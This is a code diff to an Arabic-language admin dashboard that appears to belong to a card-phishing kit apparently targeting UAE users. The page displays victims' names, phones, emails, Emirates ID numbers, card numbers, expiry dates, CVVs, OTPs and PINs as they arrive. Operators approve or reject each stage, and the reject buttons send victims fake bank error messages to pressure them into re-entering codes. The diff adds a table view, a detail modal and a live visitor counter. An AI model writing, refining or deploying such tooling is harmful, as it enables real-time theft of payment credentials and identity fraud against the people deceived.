@@ -2,27 +2,33 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لوحة تحكم فزعة - الإدارة المباشرة</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; color: #333; }
         .header { display: flex; justify-content: space-between; align-items: center; background: white; padding: 15px 30px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .order-card { background: white; border-radius: 12px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border-right: 5px solid #0066cc; position: relative; }
-        .order-header { display: flex; justify-content: space-between; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 15px; }
-        .status-badge { padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
-        .status-waiting { background: #fff7ed; color: #c2410c; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
-        .info-box { background: #f8fafc; padding: 10px; border-radius: 8px; border: 1px solid #e2e8f0; }
-        .label { font-size: 11px; color: #64748b; display: block; margin-bottom: 4px; }
-        .value { font-size: 14px; font-weight: 600; color: #1e293b; }
-        .actions { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; padding-top: 15px; border-top: 1px dashed #eee; }
-        .btn { padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.3s; }
-        .btn-approve { background: #10b981; color: white; }
-        .btn-approve:hover { background: #059669; }
-        .btn-reject { background: #ef4444; color: white; }
-        .btn-reject:hover { background: #dc2626; }
-        .btn-refresh { background: #3b82f6; color: white; }
-        .notification-sound { display: none; }
+        .active-visits-card { background: linear-gradient(to right, #6dd5ed, #2193b0); color: white; padding: 20px; border-radius: 10px; text-align: center; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .active-visits-card h3 { margin: 0 0 10px 0; font-size: 1.2em; }
+        .active-visits-card p { font-size: 2.5em; font-weight: bold; margin: 0; }
+        .orders-table-container { background: white; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); overflow: hidden; }
+        .orders-table { width: 100%; border-collapse: collapse; }
+        .orders-table th, .orders-table td { padding: 12px 15px; text-align: right; border-bottom: 1px solid #eee; }
+        .orders-table th { background-color: #f8f8f8; font-weight: bold; color: #555; }
+        .orders-table tr:hover { background-color: #f5f5f5; }
+        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 0.9em; transition: 0.3s; }
+        .btn-details { background: #007bff; color: white; }
+        .btn-details:hover { background: #0056b3; }
+        .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.4); justify-content: center; align-items: center; }
+        .modal-content { background-color: #fefefe; margin: auto; padding: 20px; border: 1px solid #888; width: 80%; max-width: 600px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); position: relative; }
+        .close-button { color: #aaa; float: left; font-size: 28px; font-weight: bold; cursor: pointer; }
+        .close-button:hover, .close-button:focus { color: black; text-decoration: none; cursor: pointer; }
+        .modal-body p { margin-bottom: 10px; }
+        .modal-actions { display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px; }
+        .btn-approve { background: #28a745; color: white; }
+        .btn-approve:hover { background: #218838; }
+        .btn-reject { background: #dc3545; color: white; }
+        .btn-reject:hover { background: #c82333; }
+        .error-message { color: #dc3545; font-weight: bold; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
@@ -34,7 +40,45 @@
         </div>
     </div>
 
-    <div id="ordersList"></div>
+    <div class="active-visits-card">
+        <h3>الزيارات النشطة</h3>
+        <p id="activeVisitsCount">0</p>
+    </div>
+
+    <div class="orders-table-container">
+        <table class="orders-table">
+            <thead>
+                <tr>
+                    <th>الدولة</th>
+                    <th>الاسم</th>
+                    <th>الهاتف</th>
+                    <th>نوع العميل</th>
+                    <th>رقم الهوية</th>
+                    <th>الحالة</th>
+                    <th>الإجراءات</th>
+                </tr>
+            </thead>
+            <tbody id="ordersTableBody">
+                <!-- Orders will be loaded here -->
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Order Details Modal -->
+    <div id="orderDetailsModal" class="modal">
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal()">&times;</span>
+            <h3>تفاصيل الطلب <span id="modalOrderId"></span></h3>
+            <div class="modal-body" id="modalBody">
+                <!-- Order details will be loaded here -->
+            </div>
+            <div class="modal-actions" id="modalActions">
+                <!-- Action buttons will be loaded here -->
+            </div>
+            <div class="error-message" id="modalErrorMessage"></div>
+        </div>
+    </div>
+
     <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
 
     <script>
@@ -42,6 +86,17 @@
         if (!token) window.location.href = 'admin_login_ar.html';
 
         let lastOrderCount = 0;
+        let currentOrderId = null; // To keep track of the order being viewed in the modal
+
+        async function fetchActiveVisits() {
+            try {
+                const response = await fetch('/api/active-visits');
+                const data = await response.json();
+                document.getElementById('activeVisitsCount').innerText = data.count;
+            } catch (e) {
+                console.error('Error fetching active visits:', e);
+            }
+        }
 
         async function fetchOrders() {
             try {
@@ -56,67 +111,99 @@
                     lastOrderCount = orders.length;
                 }
                 
-                renderOrders(orders.reverse());
+                renderOrdersTable(orders.reverse());
                 document.getElementById('lastUpdate').innerText = 'آخر تحديث: ' + new Date().toLocaleTimeString('ar-AE');
             } catch (e) { 
-                console.error('Session expired or error');
+                console.error('Session expired or error', e);
+                // Optionally redirect to login if session expired
+                // window.location.href = 'admin_login_ar.html';
             }
         }
 
-        function renderOrders(orders) {
-            const list = document.getElementById('ordersList');
+        function renderOrdersTable(orders) {
+            const tableBody = document.getElementById('ordersTableBody');
+            tableBody.innerHTML = '';
             if (orders.length === 0) {
-                list.innerHTML = '<div style="text-align:center; padding: 50px; color: #64748b;">لا توجد طلبات حالياً</div>';
+                tableBody.innerHTML = '<tr><td colspan="7" style="text-align:center; padding: 50px; color: #64748b;">لا توجد طلبات حالياً</td></tr>';
                 return;
             }
-            list.innerHTML = orders.map(order => `
-                <div class="order-card" style="border-right-color: ${getStatusColor(order.status)}">
-                    <div class="order-header">
-                        <div>
-                            <strong style="font-size: 18px;">${order.full_name || 'بدون اسم'}</strong> 
-                            <span style="color: #64748b; font-size: 12px; margin-right: 15px;">📅 ${order.timestamp}</span>
-                        </div>
-                        <span class="status-badge" style="background: ${getStatusColor(order.status)}20; color: ${getStatusColor(order.status)}">
-                            ${getStatusLabel(order.status)}
-                        </span>
-                    </div>
-                    <div class="grid">
-                        <div class="info-box"><span class="label">الهاتف</span><span class="value">${order.phone}</span></div>
-                        <div class="info-box"><span class="label">رقم المعاملة</span><span class="value" style="color: #0066cc;">${order.transactionId || order.id}</span></div>
-                        <div class="info-box"><span class="label">الاسم على البطاقة</span><span class="value">${order.cardName}</span></div>
-                        <div class="info-box"><span class="label">رقم البطاقة</span><span class="value" style="letter-spacing: 1px;">${order.cardNumber}</span></div>
-                        <div class="info-box"><span class="label">التاريخ / CVV</span><span class="value">${order.expiryDate} / ${order.cvv}</span></div>
-                        <div class="info-box" style="background: #fffbeb;"><span class="label">رمز OTP</span><span class="value" style="font-size: 20px; color: #b45309;">${order.otp || 'بانتظار الإدخال...'}</span></div>
-                        <div class="info-box" style="background: #f0f9ff;"><span class="label">الرقم السري PIN</span><span class="value" style="font-size: 20px; color: #0369a1;">${order.pin || 'بانتظار الإدخال...'}</span></div>
-                    </div>
-                    
-                    <div class="actions">
-                        ${renderActionButtons(order)}
-                    </div>
-                </div>
-            `).join('');
-        }
-
-        function getStatusColor(status) {
-            if (status.includes('waiting')) return '#f59e0b';
-            if (status.includes('approved')) return '#10b981';
-            if (status.includes('rejected')) return '#ef4444';
-            return '#64748b';
+            orders.forEach(order => {
+                const row = tableBody.insertRow();
+                row.innerHTML = `
+                    <td>${order.emirate || '-'}</td>
+                    <td>${order.full_name || '-'}</td>
+                    <td>${order.phone || '-'}</td>
+                    <td>${getStatusLabel(order.residency_status) || '-'}</td>
+                    <td>${order.emirates_id || '-'}</td>
+                    <td>${getStatusLabel(order.status)}</td>
+                    <td><button class="btn btn-details" onclick="openModal('${order.id}')">التفاصيل</button></td>
+                `;
+            });
         }
 
         function getStatusLabel(status) {
             const labels = {
-                'waiting_payment': '🔔 وصول بيانات البطاقة',
-                'waiting_otp': '🔑 وصول رمز OTP',
-                'waiting_pin': '🏧 وصول الرقم السري PIN',
-                'approved_payment': 'تم القبول (بانتظار OTP)',
-                'rejected_payment': 'تم الرفض (خطأ في البطاقة)',
-                'approved_otp': 'تم قبول OTP (بانتظار PIN)',
-                'rejected_otp': 'تم رفض OTP',
-                'approved_pin': '✅ عملية ناجحة بالكامل',
-                'rejected_pin': 'تم رفض PIN'
+                'citizen': 'مواطن',
+                'resident': 'مقيم',
+                'waiting_payment': '🔔 بانتظار البطاقة',
+                'approved_payment': '✅ تم قبول البطاقة',
+                'rejected_payment': '❌ رفض البطاقة',
+                'waiting_otp': '🔑 بانتظار OTP',
+                'approved_otp': '✅ تم قبول OTP',
+                'rejected_otp': '❌ رفض OTP',
+                'waiting_pin': '🏧 بانتظار PIN',
+                'approved_pin': '✅ تم قبول PIN',
+                'rejected_pin': '❌ رفض PIN',
+                'personal_data_submitted': 'بيانات شخصية فقط'
             };
             return labels[status] || status;
+        }
+
+        async function openModal(orderId) {
+            currentOrderId = orderId;
+            const modal = document.getElementById('orderDetailsModal');
+            const modalBody = document.getElementById('modalBody');
+            const modalActions = document.getElementById('modalActions');
+            const modalErrorMessage = document.getElementById('modalErrorMessage');
+            modalErrorMessage.style.display = 'none';
+
+            try {
+                const response = await fetch('/api/get-data', { headers: { 'Authorization': token } });
+                const allOrders = await response.json();
+                const order = allOrders.find(o => o.id === orderId);
+
+                if (order) {
+                    document.getElementById('modalOrderId').innerText = order.id;
+                    modalBody.innerHTML = `
+                        <p><strong>الاسم الكامل:</strong> ${order.full_name || '-'}</p>
+                        <p><strong>الهاتف:</strong> ${order.phone || '-'}</p>
+                        <p><strong>البريد الإلكتروني:</strong> ${order.email || '-'}</p>
+                        <p><strong>رقم الهوية:</strong> ${order.emirates_id || '-'}</p>
+                        <p><strong>نوع العميل:</strong> ${getStatusLabel(order.residency_status) || '-'}</p>
+                        <p><strong>رقم المعاملة:</strong> ${order.transactionId || '-'}</p>
+                        <p><strong>اسم صاحب البطاقة:</strong> ${order.cardName || '-'}</p>
+                        <p><strong>رقم البطاقة:</strong> ${order.cardNumber || '-'}</p>
+                        <p><strong>تاريخ الانتهاء:</strong> ${order.expiryDate || '-'}</p>
+                        <p><strong>CVV:</strong> ${order.cvv || '-'}</p>
+                        <p><strong>OTP:</strong> ${order.otp || 'بانتظار الإدخال...'}</p>
+                        <p><strong>PIN:</strong> ${order.pin || 'بانتظار الإدخال...'}</p>
+                        <p><strong>الحالة:</strong> ${getStatusLabel(order.status)}</p>
+                        <p><strong>آخر خطأ:</strong> ${order.lastError || '-'}</p>
+                    `;
+                    modalActions.innerHTML = renderActionButtons(order);
+                    modal.style.display = 'flex';
+                } else {
+                    alert('الطلب غير موجود.');
+                }
+            } catch (e) {
+                console.error('Error fetching order details:', e);
+                alert('حدث خطأ أثناء جلب تفاصيل الطلب.');
+            }
+        }
+
+        function closeModal() {
+            document.getElementById('orderDetailsModal').style.display = 'none';
+            currentOrderId = null;
         }
 
         function renderActionButtons(order) {
@@ -142,24 +229,32 @@
         }
 
         async function updateStatus(orderId, status, error = '') {
-            await fetch('/api/update-order-status', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'Authorization': token
-                },
-                body: JSON.stringify({ orderId, status, error })
-            });
-            fetchOrders();
+            try {
+                const response = await fetch('/api/update-order-status', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Authorization': token
+                    },
+                    body: JSON.stringify({ orderId, status, error })
+                });
+                if (!response.ok) throw new Error('Failed to update status');
+                closeModal();
+                fetchOrders();
+            } catch (e) {
+                console.error('Error updating status:', e);
+                document.getElementById('modalErrorMessage').innerText = 'حدث خطأ أثناء تحديث الحالة.';
+                document.getElementById('modalErrorMessage').style.display = 'block';
+            }
         }
 
         function rejectPayment(id) {
-            const msg = "فشلت عملية الدفع. بطاقاتك غير مفعلة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.";
+            const msg = "فشلت عملية الدفع. بطاقتك غير مفعلة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.";
             updateStatus(id, 'rejected_payment', msg);
         }
 
         function rejectOTP(id) {
-            const msg = "الرمز الذي أدخلته غير صحيح. قد تكون بطاقتك غير مفعلة للدفع عبر الإنترنت.";
+            const msg = "الرمز الذي أدخلته غير صالح. قد تكون بطاقتك غير مفعلة للدفع عبر الإنترنت.";
             updateStatus(id, 'rejected_otp', msg);
         }
 
@@ -168,8 +263,11 @@
             updateStatus(id, 'rejected_pin', msg);
         }
 
-        setInterval(fetchOrders, 3000);
+        // Initial fetches and polling
+        fetchActiveVisits();
         fetchOrders();
+        setInterval(fetchActiveVisits, 10000); // Update active visits every 10 seconds
+        setInterval(fetchOrders, 3000); // Update orders every 3 seconds
     </script>
 </body>
 </html>
